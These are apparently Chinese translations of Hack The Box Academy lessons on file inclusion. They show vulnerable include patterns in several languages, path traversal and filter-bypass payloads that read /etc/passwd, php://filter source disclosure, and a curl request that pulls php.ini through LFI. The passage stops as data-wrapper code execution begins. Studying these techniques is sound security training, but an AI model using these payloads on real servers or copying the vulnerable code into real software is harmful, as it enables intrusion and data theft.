#lfi #hacking
[source](https://academy.hackthebox.com/module/23/section/250)
# 文件包含漏洞简介

许多现代后端语言，如 `PHP`、`Javascript` 或 `Java`，使用 HTTP 参数来指定网页上显示的内容，这允许构建动态网页，减少脚本的整体大小，并简化代码。在这种情况下，参数用于指定页面上显示的资源。如果这些功能没有安全编码，攻击者可能会操纵这些参数来显示托管服务器上任何本地文件的内容，从而导致 [本地文件包含 (LFI, Local File Inclusion)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) 漏洞。

---

## 本地文件包含 (LFI)

我们通常发现 LFI 最常见的地方是模板引擎（templating engines）。为了让大部分 Web 应用程序在页面之间导航时看起来相同，模板引擎会显示一个包含公共静态部分的页面，如 `header`（页头）、`navigation bar`（导航栏）和 `footer`（页脚），然后动态加载页面之间变化的其他内容。否则，当对任何静态部分进行更改时，服务器上的每个页面都需要修改。这就是为什么我们经常看到类似 `/index.php?page=about` 这样的参数，其中 `index.php` 设置静态内容（例如页头/页脚），然后只拉取参数中指定的动态内容，在这种情况下可能是从名为 `about.php` 的文件中读取。由于我们可以控制请求中的 `about` 部分，因此可能让 Web 应用程序获取其他文件并在页面上显示它们。

LFI 漏洞可能导致源代码泄露、敏感数据暴露，甚至在某些条件下导致远程代码执行（remote code execution）。泄露源代码可能允许攻击者测试代码中的其他漏洞，这可能会揭示以前未知的漏洞。此外，泄露敏感数据可能使攻击者能够枚举远程服务器的其他弱点，甚至泄露凭据和密钥，使他们能够直接访问远程服务器。在特定条件下，LFI 还可能允许攻击者在远程服务器上执行代码，这可能会危及整个后端服务器以及与其连接的任何其他服务器。

---

## 易受攻击代码示例

让我们看一些易受文件包含攻击的代码示例，以了解这些漏洞是如何发生的。如前所述，文件包含漏洞可能发生在许多最流行的 Web 服务器和开发框架中，如 `PHP`、`NodeJS`、`Java`、`.Net` 等。每个框架都有略微不同的包含本地文件的方法，但它们都有一个共同点：从指定路径加载文件。

这样的文件可能是动态页头或基于用户指定语言的不同内容。例如，页面可能有一个 `?language` GET 参数，如果用户从下拉菜单更改语言，则会返回相同的页面但带有不同的 `language` 参数（例如 `?language=es`）。在这种情况下，更改语言可能会更改 Web 应用程序加载页面的目录（例如 `/en/` 或 `/es/`）。如果我们可以控制正在加载的路径，那么我们可能能够利用此漏洞读取其他文件，并可能达到远程代码执行。

#### #PHP

在 `PHP` 中，我们可以使用 `include()` 函数在加载页面时加载本地或远程文件。如果传递给 `include()` 的 `path`（路径）来自用户控制的参数，如 `GET` 参数，并且`代码没有明确过滤和清理用户输入`，那么代码就容易受到文件包含攻击。以下代码片段显示了一个示例：

Code: php

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

我们看到 `language` 参数直接传递给 `include()` 函数。因此，我们在 `language` 参数中传递的任何路径都将被加载到页面上，包括后端服务器上的任何本地文件。这不仅限于 `include()` 函数，还有许多其他 PHP 函数，如果我们控制了传递给它们的路径，也会导致相同的漏洞。这些函数包括 `include_once()`、`require()`、`require_once()`、`file_get_contents()` 以及其他几个函数。

**注意：** 在本模块中，我们将主要关注在 Linux 后端服务器上运行的 PHP Web 应用程序。但是，大多数技术和攻击都适用于大多数其他框架，因此我们的示例对于用任何其他语言编写的 Web 应用程序都是相同的。

#### #NodeJS

与 PHP 一样，NodeJS Web 服务器也可能根据 HTTP 参数加载内容。以下是一个基本示例，说明如何使用 GET 参数 `language` 来控制写入页面的数据：

Code: javascript

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

正如我们所见，从 URL 传递的任何参数都被 `readfile` 函数使用，然后将文件内容写入 HTTP 响应。另一个例子是 `Express.js` 框架中的 `render()` 函数。以下示例使用 `language` 参数来确定应该从哪个目录拉取 `about.html` 页面：

Code: js

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

与我们之前的示例不同，其中 GET 参数是在 URL 中的 (`?`) 字符之后指定的，上面的示例从 URL 路径获取参数（例如 `/about/en` 或 `/about/es`）。由于该参数直接在 `render()` 函数中用于指定渲染的文件，我们可以更改 URL 来显示不同的文件。

#### #Java

相同的概念适用于许多其他 Web 服务器。以下示例展示了 Java Web 服务器的 Web 应用程序如何根据指定的参数包含本地文件，使用 `include` 函数：

Code: jsp

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

`include` 函数可以将文件或页面 URL 作为其参数，然后将对象渲染到前端模板中，类似于我们之前在 NodeJS 中看到的那些。`import` 函数也可用于渲染本地文件或 URL，如以下示例所示：

Code: jsp

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

#### .NET

最后，让我们看一个文件包含漏洞如何在 .NET Web 应用程序中发生的示例。`Response.WriteFile` 函数的工作方式与我们之前的所有示例非常相似，因为它接受文件路径作为输入并将其内容写入响应。路径可以从 GET 参数中检索以进行动态内容加载，如下所示：

Code: cs

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}
```

此外，`@Html.Partial()` 函数也可用于将指定文件作为前端模板的一部分进行渲染，类似于我们之前看到的：

Code: cs

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

最后，`include` 函数可用于渲染本地文件或远程 URL，也可以执行指定的文件：

Code: cs

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## 读取与执行

从以上所有示例中，我们可以看到文件包含漏洞可能发生在任何 Web 服务器和任何开发框架中，因为它们都提供了加载动态内容和处理前端模板的功能。

需要记住的最重要的一点是，`上述某些函数只读取指定文件的内容，而其他函数也会执行指定的文件`。此外，其中一些函数允许指定远程 URL，而其他函数只能处理后端服务器的本地文件。

下表显示了哪些函数可以执行文件，哪些只能读取文件内容：

|**函数**|**读取内容**|**执行**|**远程 URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

这是一个需要注意的重要区别，因为执行文件可能允许我们执行函数并最终导致代码执行，而仅读取文件内容只能让我们读取源代码而无法执行代码。此外，如果我们在白盒测试或代码审计中可以访问源代码，了解这些操作有助于我们识别潜在的文件包含漏洞，特别是如果它们有用户控制的输入传入其中。

在所有情况下，文件包含漏洞都是关键的，最终可能导致整个后端服务器被入侵。即使我们只能读取 Web 应用程序源代码，它仍然可能允许我们入侵 Web 应用程序，因为它可能揭示如前所述的其他漏洞，并且源代码可能还包含数据库密钥、管理员凭据或其他敏感信息。
#lfi #hacking
[source](https://academy.hackthebox.com/module/23/section/251)

# 本地文件包含 (LFI)

现在我们了解了文件包含漏洞是什么以及它们是如何发生的，我们可以开始学习如何在不同场景中利用这些漏洞来读取后端服务器上本地文件的内容。

---

## 基础 LFI

本节末尾的练习向我们展示了一个 Web 应用程序示例，允许用户将语言设置为英语或西班牙语：



![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang.png)

如果我们通过点击选择一种语言（例如 `Spanish`），我们会看到内容文本变成西班牙语：



![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_es.png)

我们还注意到 URL 包含一个 `language` 参数，现在设置为我们选择的语言 (`es.php`)。有几种方式可以更改内容以匹配我们指定的语言。它可能是根据指定参数从不同的数据库表中提取内容，或者可能是加载完全不同版本的 Web 应用程序。但是，如前所述，使用模板引擎加载页面的一部分是最简单和最常用的方法。

因此，如果 Web 应用程序确实在拉取一个现在包含在页面中的文件，我们可能能够更改正在拉取的文件以读取不同本地文件的内容。两个常见的可读文件在大多数后端服务器上都可用，分别是 Linux 上的 `/etc/passwd` 和 Windows 上的 `C:\Windows\boot.ini`。那么，让我们将参数从 `es` 更改为 `/etc/passwd`：



![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)

正如我们所见，该页面确实存在漏洞，我们能够读取 `passwd` 文件的内容并识别后端服务器上存在哪些用户。

---

## 路径遍历

在前面的示例中，我们通过指定其`绝对路径`（例如 `/etc/passwd`）来读取文件。如果整个输入在 `include()` 函数中使用而没有任何添加，这将有效，如以下示例所示：

Code: php

```php
include($_GET['language']);
```

在这种情况下，如果我们尝试读取 `/etc/passwd`，那么 `include()` 函数将直接获取该文件。但是，在许多情况下，Web 开发人员可能会在 `language` 参数后附加或前置一个字符串。例如，`language` 参数可能用于文件名，并可能添加在目录之后，如下所示：

Code: php

```php
include("./languages/" . $_GET['language']);
```

在这种情况下，如果我们尝试读取 `/etc/passwd`，那么传递给 `include()` 的路径将是 (`./languages//etc/passwd`)，由于此文件不存在，我们将无法读取任何内容：



![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd_failed.png)

正如预期的那样，返回的详细错误显示了传递给 `include()` 函数的字符串，说明语言目录中没有 `/etc/passwd`。

**注意：** 我们只是出于教育目的在此 Web 应用程序上启用了 PHP 错误，以便我们可以正确理解 Web 应用程序如何处理我们的输入。对于生产 Web 应用程序，这些错误永远不应该显示。此外，我们所有的攻击应该都可以在没有错误的情况下进行，因为它们不依赖于错误信息。

我们可以通过使用`相对路径`遍历目录来轻松绕过此限制。为此，我们可以在文件名之前添加 `../`，它指向父目录。例如，如果语言目录的完整路径是 `/var/www/html/languages/`，那么使用 `../index.php` 将指向父目录上的 `index.php` 文件（即 `/var/www/html/index.php`）。

因此，我们可以使用这个技巧回退几个目录直到到达根路径（即 `/`），然后指定我们的绝对文件路径（例如 `../../../../etc/passwd`），该文件应该存在：



![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd.png)

正如我们所见，这次我们能够读取文件，无论我们在哪个目录中。这个技巧即使整个参数都在 `include()` 函数中使用也能工作，所以我们可以默认使用这种技术，它在两种情况下都应该有效。此外，如果我们在根路径 (`/`) 并使用 `../`，那么我们仍然会留在根路径中。因此，如果我们不确定 Web 应用程序所在的目录，我们可以添加很多次 `../`，这不应该破坏路径（即使我们添加一百次！）。

**提示：** 高效并且不添加不必要的 `../` 总是有用的，特别是如果我们正在编写报告或编写漏洞利用程序。因此，总是尝试找到有效的最小 `../` 数量并使用它。您也可以计算您距离根路径有多少个目录并使用那么多。例如，对于 `/var/www/html/`，我们距离根路径有 `3` 个目录，所以我们可以使用 3 次 `../`（即 `../../../`）。

---

## 文件名前缀

在我们之前的示例中，我们在目录之后使用 `language` 参数，因此我们可以遍历路径以读取 `passwd` 文件。在某些情况下，我们的输入可能附加在不同的字符串之后。例如，它可能与前缀一起使用以获取完整的文件名，如以下示例所示：

Code: php

```php
include("lang_" . $_GET['language']);
```

在这种情况下，如果我们尝试使用 `../../../etc/passwd` 遍历目录，最终字符串将是 `lang_../../../etc/passwd`，这是无效的：



![](https://academy.hackthebox.com/storage/modules/23/lfi_another_example1.png)

正如预期的那样，错误告诉我们此文件不存在。因此，我们可以在有效载荷之前添加一个 `/` 作为前缀，而不是直接使用路径遍历，这应该将前缀视为目录，然后我们应该能够绕过文件名并遍历目录：



![](https://academy.hackthebox.com/storage/modules/23/lfi_another_example_passwd1.png)

**注意：** 这可能并不总是有效，因为在这个例子中，名为 `lang_/` 的目录可能不存在，所以我们的相对路径可能不正确。此外，`任何附加到我们输入的前缀可能会破坏一些文件包含技术`，我们将在接下来的部分中讨论，如使用 PHP 包装器和过滤器或 RFI。

---

## 附加扩展名

另一个非常常见的例子是当扩展名被附加到 `language` 参数时，如下所示：

Code: php

```php
include($_GET['language'] . ".php");
```

这相当常见，因为在这种情况下，我们不必每次需要更改语言时都写扩展名。这也可能更安全，因为它可能限制我们只能包含 PHP 文件。在这种情况下，如果我们尝试读取 `/etc/passwd`，那么包含的文件将是 `/etc/passwd.php`，它不存在：



![](https://academy.hackthebox.com/storage/modules/23/lfi_extension_failed.png)

有几种技术可以用来绕过这个限制，我们将在接下来的部分中讨论。

**练习：** 尝试通过 LFI 读取任何 php 文件（例如 index.php），看看您是否会获得其源代码，或者文件是否被渲染为 HTML。

---

## 二次攻击

正如我们所见，LFI 攻击可以有不同的形式。另一种常见且稍微高级的 LFI 攻击是 `二次攻击（Second Order Attack）`。这是因为许多 Web 应用程序功能可能会不安全地根据用户控制的参数从后端服务器拉取文件。

例如，Web 应用程序可能允许我们通过类似 (`/profile/$username/avatar.png`) 的 URL 下载我们的头像。如果我们构造一个恶意的 LFI 用户名（例如 `../../../etc/passwd`），那么可能可以将正在拉取的文件更改为服务器上的另一个本地文件并获取它，而不是我们的头像。

在这种情况下，我们将在用户名中用恶意 LFI 有效载荷污染数据库条目。然后，另一个 Web 应用程序功能将使用这个被污染的条目来执行我们的攻击（即根据用户名值下载我们的头像）。这就是为什么这种攻击被称为 `二次攻击`。

开发人员经常忽视这些漏洞，因为他们可能会防范直接用户输入（例如来自 `?page` 参数），但他们可能会信任从数据库中拉取的值，比如我们这里的用户名。如果我们在注册期间成功污染了我们的用户名，那么攻击就有可能实现。

使用二次攻击利用 LFI 漏洞类似于我们在本节中讨论的内容。唯一的不同是我们需要找到一个根据我们间接控制的值拉取文件的功能，然后尝试控制该值以利用漏洞。

**注意：** 本节中提到的所有技术都应该适用于任何 LFI 漏洞，无论后端开发语言或框架如何。#lfi #hacking
[source](https://academy.hackthebox.com/module/23/section/1491)

在上一节中，我们看到了几种可用于不同类型 LFI 漏洞的攻击方式。在许多情况下，我们可能面对的 Web 应用程序会针对文件包含应用各种保护措施，因此我们的普通 LFI 有效载荷将不起作用。尽管如此，除非 Web 应用程序针对恶意 LFI 用户输入进行了适当的安全保护，否则我们可能能够绕过现有的保护措施并实现文件包含。

---

## 非递归路径遍历过滤器

针对 LFI 最基本的过滤器之一是搜索和替换过滤器，它只是删除 (`../`) 子字符串以避免路径遍历。例如：

Code: php

```php
$language = str_replace('../', '', $_GET['language']);
```

上述代码应该可以防止路径遍历，从而使 LFI 无效。如果我们尝试在上一节中尝试的 LFI 有效载荷，我们会得到以下结果：



![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist.png)

我们看到所有 `../` 子字符串都被删除了，这导致最终路径变成 `./languages/etc/passwd`。然而，这个过滤器非常不安全，因为它没有`递归地删除` `../` 子字符串，因为它只对输入字符串运行一次，不会对输出字符串应用过滤器。例如，如果我们使用 `....//` 作为我们的有效载荷，那么过滤器会删除 `../`，输出字符串将是 `../`，这意味着我们仍然可以执行路径遍历。让我们尝试应用这个逻辑再次包含 `/etc/passwd`：



![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd.png)

正如我们所见，这次包含成功了，我们能够成功读取 `/etc/passwd`。`....//` 子字符串不是我们可以使用的唯一绕过方式，因为我们还可以使用 `..././` 或 `....\/` 以及其他几种递归 LFI 有效载荷。此外，在某些情况下，转义正斜杠字符也可能有效以避免路径遍历过滤器（例如 `....\/`），或添加额外的正斜杠（例如 `....////`）

---

## #Encoding（编码）

一些 Web 过滤器可能会阻止包含某些 LFI 相关字符的输入过滤器，如点 `.` 或用于路径遍历的斜杠 `/`。然而，其中一些过滤器可能通过 URL 编码我们的输入来绕过，这样它将不再包含这些坏字符，但一旦到达易受攻击的函数仍会被解码回我们的路径遍历字符串。5.3.4 及更早版本的核心 PHP 过滤器特别容易受到此绕过的影响，但即使在较新版本上，我们也可能发现可以通过 URL 编码绕过的自定义过滤器。

如果目标 Web 应用程序不允许在我们的输入中使用 `.` 和 `/`，我们可以将 `../` URL 编码为 `%2e%2e%2f`，这可能会绕过过滤器。为此，我们可以使用任何在线 URL 编码工具或使用 Burp Suite Decoder 工具，如下所示：![burp_url_encode](https://academy.hackthebox.com/storage/modules/23/burp_url_encode.jpg)

**注意：** 为了使这有效，我们必须对所有字符进行 URL 编码，包括点。一些 URL 编码器可能不会编码点，因为它们被认为是 URL 方案的一部分。

让我们尝试对我们之前过滤 `../` 字符串的易受攻击 Web 应用程序使用此编码的 LFI 有效载荷：



![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

正如我们所见，我们也能够成功绕过过滤器并使用路径遍历读取 `/etc/passwd`。此外，我们还可以使用 Burp Decoder 对编码字符串再次编码以获得`双重编码`字符串，这也可能绕过其他类型的过滤器。

您可以参考 [Command Injections](https://academy.hackthebox.com/module/details/109) 模块了解更多关于绕过各种黑名单字符的信息，因为相同的技术也可能与 LFI 一起使用。

---

## 批准的路径

一些 Web 应用程序还可能使用正则表达式来确保被包含的文件位于特定路径下。例如，我们一直在处理的 Web 应用程序可能只接受 `./languages` 目录下的路径，如下所示：

Code: php

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

要找到批准的路径，我们可以检查现有表单发送的请求，看看它们为正常的 Web 功能使用什么路径。此外，我们可以在同一路径下对 Web 目录进行模糊测试，并尝试不同的路径直到我们得到匹配。为了绕过这个，我们可以使用路径遍历并以批准的路径开始我们的有效载荷，然后使用 `../` 回到根目录并读取我们指定的文件，如下所示：



![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

一些 Web 应用程序可能会将此过滤器与之前的过滤器之一一起应用，因此我们可以通过以批准的路径开始我们的有效载荷来组合这两种技术，然后对我们的有效载荷进行 URL 编码或使用递归有效载荷。

**注意：** 到目前为止提到的所有技术都应该适用于任何 LFI 漏洞，无论后端开发语言或框架如何。

---

## 附加扩展名

正如在上一节中讨论的，一些 Web 应用程序会在我们的输入字符串后附加扩展名（例如 `.php`），以确保我们包含的文件是预期的扩展名。在 PHP 的现代版本中，我们可能无法绕过这个限制，只能读取该扩展名的文件，这可能仍然有用，正如我们将在下一节中看到的（例如用于读取源代码）。

还有一些其他技术可以使用，但它们`在 PHP 的现代版本中已经过时，只适用于 5.3/5.4 之前的 PHP 版本`。然而，仍然有必要提及它们，因为一些 Web 应用程序可能仍在旧服务器上运行，这些技术可能是唯一可能的绕过方式。

#### 路径截断

在早期版本的 PHP 中，定义的字符串最大长度为 4096 个字符，这可能是由于 32 位系统的限制。如果传递更长的字符串，它将被`截断`，最大长度之后的任何字符都将被忽略。此外，PHP 过去也会删除路径名中的尾随斜杠和单个点，因此如果我们调用 (`/etc/passwd/.`)，那么 `/.` 也会被截断，PHP 会调用 (`/etc/passwd`)。PHP 和 Linux 系统通常也会忽略路径中的多个斜杠（例如 `////etc/passwd` 与 `/etc/passwd` 相同）。同样，路径中间的当前目录快捷方式 (`.`) 也会被忽略（例如 `/etc/./passwd`）。

如果我们将这两个 PHP 限制结合在一起，我们可以创建非常长的字符串，这些字符串最终会评估为正确的路径。每当我们达到 4096 字符限制时，附加的扩展名 (`.php`) 将被截断，我们将拥有一个没有附加扩展名的路径。最后，还需要注意的是，为了使这种技术有效，我们还需要`以不存在的目录开始路径`。

这种有效载荷的一个例子如下：

Code: url

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

当然，我们不必手动输入 `./` 2048 次（共 4096 个字符），但我们可以使用以下命令自动创建此字符串：

  Path Truncation

```shell-session
tr01ax@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

我们也可以增加 `../` 的数量，因为添加更多仍然会让我们落在根目录中，正如上一节中解释的那样。但是，如果我们使用这种方法，我们应该计算字符串的完整长度，以确保只有 `.php` 被截断，而不是我们请求的字符串末尾的文件 (`/etc/passwd`)。这就是为什么使用第一种方法会更容易。

#### 空字节

5.5 之前的 PHP 版本容易受到`空字节注入（null byte injection）`的影响，这意味着在字符串末尾添加空字节 (`%00`) 将终止字符串，不考虑其后的任何内容。这是由于字符串在低级内存中的存储方式，内存中的字符串必须使用空字节来指示字符串的结束，正如在 Assembly、C 或 C++ 语言中看到的那样。

要利用此漏洞，我们可以用空字节结束我们的有效载荷（例如 `/etc/passwd%00`），这样传递给 `include()` 的最终路径将是 (`/etc/passwd%00.php`)。这样，即使 `.php` 被附加到我们的字符串，空字节之后的任何内容都将被截断，因此实际使用的路径将是 `/etc/passwd`，从而使我们能够绕过附加的扩展名。#lfi #php #hacking
[source](https://academy.hackthebox.com/module/23/section/1492)
# PHP 过滤器

许多流行的 Web 应用程序是用 PHP 开发的，以及使用不同 PHP 框架（如 Laravel 或 Symfony）构建的各种自定义 Web 应用程序。如果我们在 PHP Web 应用程序中识别出 LFI 漏洞，那么我们可以利用不同的 [PHP Wrappers（PHP 包装器）](https://www.php.net/manual/en/wrappers.php.php) 来扩展我们的 LFI 利用，甚至可能达到远程代码执行。

PHP Wrappers（PHP 包装器）允许我们在应用层访问不同的 I/O 流，如标准输入/输出、文件描述符和内存流。这对 PHP 开发者来说有很多用途。但作为 Web 渗透测试人员，我们可以利用这些包装器来扩展我们的利用攻击，能够读取 PHP 源代码文件甚至执行系统命令。这不仅对 LFI（本地文件包含）攻击有用，对其他 Web 攻击如 XXE 也同样适用，如 [Web Attacks](https://academy.hackthebox.com/module/details/134) 模块所述。

在本节中，我们将了解如何使用基本的 PHP 过滤器来读取 PHP 源代码，在下一节中，我们将了解不同的 PHP 包装器如何帮助我们通过 LFI 漏洞获得远程代码执行。

---

## Input Filters（输入过滤器）

[PHP Filters](https://www.php.net/manual/en/filters.php) 是一种 PHP 包装器，我们可以传递不同类型的输入并通过我们指定的过滤器进行过滤。要使用 PHP 包装器流，我们可以在字符串中使用 `php://` 方案，并通过 `php://filter/` 访问 PHP 过滤器包装器。

`filter` 包装器有几个参数，但我们攻击所需的主要参数是 `resource` 和 `read`。`resource` 参数是过滤器包装器所必需的，通过它我们可以指定要应用过滤器的流（例如本地文件），而 `read` 参数可以对输入资源应用不同的过滤器，因此我们可以用它来指定要对资源应用哪个过滤器。

有四种不同类型的过滤器可供使用，分别是 [String Filters](https://www.php.net/manual/en/filters.string.php)（字符串过滤器）、[Conversion Filters](https://www.php.net/manual/en/filters.convert.php)（转换过滤器）、[Compression Filters](https://www.php.net/manual/en/filters.compression.php)（压缩过滤器）和 [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)（加密过滤器）。您可以在各自的链接上阅读更多关于每种过滤器的信息，但对 LFI 攻击有用的过滤器是 `Conversion Filters` 下的 `convert.base64-encode` 过滤器。

---

## Fuzzing for PHP Files（模糊测试查找 PHP 文件）

第一步是使用 `ffuf` 或 `gobuster` 等工具对不同可用的 PHP 页面进行模糊测试，如 [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) 模块所述：

```shell-session
tr01ax@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**提示：** 与正常的 Web 应用程序使用不同，我们不限于 HTTP 响应码为 200 的页面，因为我们有本地文件包含访问权限，所以我们应该扫描所有代码，包括 `301`、`302` 和 `403` 页面，我们也应该能够读取它们的源代码。

即使在阅读了任何已识别文件的源代码后，我们也可以`扫描它们以查找其他引用的 PHP 文件`，然后也读取这些文件，直到我们能够捕获 Web 应用程序的大部分源代码或对其功能有准确的了解。也可以从阅读 `index.php` 开始并扫描它以获取更多引用等等，但对 PHP 文件进行模糊测试可能会发现一些用其他方式无法找到的文件。

---

## Standard PHP Inclusion（标准 PHP 包含）

在前面的部分中，如果您尝试通过 LFI 包含任何 PHP 文件，您会注意到包含的 PHP 文件会被执行，并最终作为普通 HTML 页面呈现。例如，让我们尝试包含 `config.php` 页面（`.php` 扩展名由 Web 应用程序附加）：



![](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)

如我们所见，在 LFI 字符串的位置我们得到了一个空结果，因为 `config.php` 很可能只是设置 Web 应用程序配置而不呈现任何 HTML 输出。

这在某些情况下可能很有用，比如访问我们无法访问的本地 PHP 页面（即 SSRF），但在大多数情况下，我们更感兴趣的是通过 LFI 读取 PHP 源代码，因为源代码往往会揭示有关 Web 应用程序的重要信息。这就是 `base64` PHP 过滤器变得有用的地方，因为我们可以使用它对 PHP 文件进行 base64 编码，然后我们会得到编码后的源代码而不是让它被执行和呈现。这对于我们处理附加了 PHP 扩展名的 LFI 的情况特别有用，因为我们可能被限制只能包含 PHP 文件，如前一节所讨论的。

**注意：** 这同样适用于 PHP 以外的其他 Web 应用程序语言，只要易受攻击的函数可以执行文件。否则，我们将直接获取源代码，不需要使用额外的过滤器/函数来读取源代码。请参阅第 1 节中的函数表以了解哪些函数具有哪些权限。

---

## Source Code Disclosure（源代码泄露）

一旦我们有了想要读取的潜在 PHP 文件列表，我们可以开始使用 `base64` PHP 过滤器来泄露它们的源代码。让我们尝试使用 base64 过滤器读取 `config.php` 的源代码，通过为 `read` 参数指定 `convert.base64-encode`，为 `resource` 参数指定 `config`，如下所示：

Code: url

```url
php://filter/read=convert.base64-encode/resource=config
```



![](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

**注意：** 我们故意将资源文件放在字符串的末尾，因为 `.php` 扩展名会自动附加到我们输入字符串的末尾，这将使我们指定的资源变为 `config.php`。

如我们所见，与常规 LFI 尝试不同，使用 base64 过滤器返回了一个编码字符串，而不是我们之前看到的空结果。我们现在可以解码这个字符串以获取 `config.php` 源代码的内容，如下所示：

```shell-session
tr01ax@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

**提示：** 复制 base64 编码字符串时，请确保复制整个字符串，否则它将无法完全解码。您可以查看页面源代码以确保复制了整个字符串。

我们现在可以调查此文件以查找凭据或数据库密钥等敏感信息，并开始识别更多引用，然后泄露它们的源代码。#lfi #php #wrappers #hacking #shell
[source](https://academy.hackthebox.com/module/23/section/253)
# PHP Wrappers（PHP 包装器）

到目前为止，在本模块中，我们一直在利用文件包含漏洞通过各种方法泄露本地文件。从本节开始，我们将开始学习如何使用文件包含漏洞在后端服务器上执行代码并获得对它们的控制。

我们可以使用许多方法来执行远程命令，每种方法都有特定的用例，因为它们取决于后端语言/框架和易受攻击函数的功能。获得后端服务器控制权的一种简单且常见的方法是枚举用户凭据和 SSH 密钥，然后使用这些凭据通过 SSH 或任何其他远程会话登录到后端服务器。例如，我们可能会在 `config.php` 等文件中找到数据库密码，如果他们重用相同的密码，这可能与用户的密码匹配。或者我们可以检查每个用户主目录中的 `.ssh` 目录，如果读取权限设置不正确，那么我们可能能够获取他们的私钥（`id_rsa`）并使用它 SSH 进入系统。

除了这些简单的方法之外，还有一些方法可以直接通过易受攻击的函数实现远程代码执行，而无需依赖数据枚举或本地文件权限。在本节中，我们将从 PHP Web 应用程序上的远程代码执行开始。我们将在上一节学到的内容基础上，利用不同的 `PHP Wrappers` 来获得远程代码执行。然后，在接下来的章节中，我们将学习其他可用于 PHP 和其他语言的远程代码执行方法。

---

## Data

[data](https://www.php.net/manual/en/wrappers.data.php) 包装器可用于包含外部数据，包括 PHP 代码。但是，只有当 PHP 配置中启用了 (`allow_url_include`) 设置时，data 包装器才可用。因此，让我们首先通过 LFI 漏洞读取 PHP 配置文件来确认此设置是否已启用。

#### Checking PHP Configurations（检查 PHP 配置）

为此，我们可以包含位于 (`/etc/php/X.Y/apache2/php.ini`)（Apache）或 (`/etc/php/X.Y/fpm/php.ini`)（Nginx）的 PHP 配置文件，其中 `X.Y` 是您安装的 PHP 版本。我们可以从最新的 PHP 版本开始，如果找不到配置文件则尝试更早的版本。我们还将使用上一节中使用的 `base64` 过滤器，因为 `.ini` 文件与 `.php` 文件类似，应该进行编码以避免破坏。最后，我们将使用 cURL 或 Burp 而不是浏览器，因为输出字符串可能很长，我们应该能够正确捕获它：

  Checking PHP Configurations

```shell-session
tr01ax@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

获取 base64 编码字符串后，我们可以对其进行解码并 `grep` `allow_url_include` 以查看其值：

  Checking PHP Configurations

```shell-session
tr01ax@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

很好！我们看到此选项已启用，因此我们可以使用 `data` 包装器。了解如何检查 `allow_url_include` 选项非常重要，因为`此选项默认未启用`，并且是其他几种 LFI 攻击所必需的，例如使用 `input` 包装器或任何 RFI（远程文件包含）攻击，我们接下来会看到。看到此选项被启用并不罕见，因为许多 Web 应用程序依赖它来正常运行，例如一些 WordPress 插件和主题。

#### Remote Code Execution（远程代码执行）

启用 `allow_url_include` 后，我们可以继续进行 `data` 包装器攻击。如前所述，`data` 包装器可用于包含外部数据，包括 PHP 代码。我们还可以用 `text/plain;base64` 传递 `base64` 编码的字符串，它能够解码并执行 PHP 代码。

